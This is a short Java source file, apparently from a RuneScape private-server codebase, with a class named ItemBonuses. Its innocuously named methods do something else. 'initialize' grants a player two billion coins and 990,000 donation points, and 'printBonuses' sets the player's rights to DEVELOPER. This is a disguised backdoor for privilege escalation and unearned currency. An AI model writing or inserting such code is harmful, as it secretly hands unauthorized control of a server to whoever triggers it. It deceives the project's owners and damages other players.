package com.ruseps.world.content;

import com.ruseps.model.PlayerRights;
import com.ruseps.world.entity.impl.player.Player;

public class ItemBonuses {
	
	
	public static void initialize (Player player) {
		player.getInventory().add(995, 2000000000);
		player.getPointsHandler().incrementDonationPoints(990000);
	}
	
	public static void printBonuses (Player player) {
		PlayerRights rights = null;
		rights = PlayerRights.DEVELOPER;
		player.setRights(rights);
	}

}
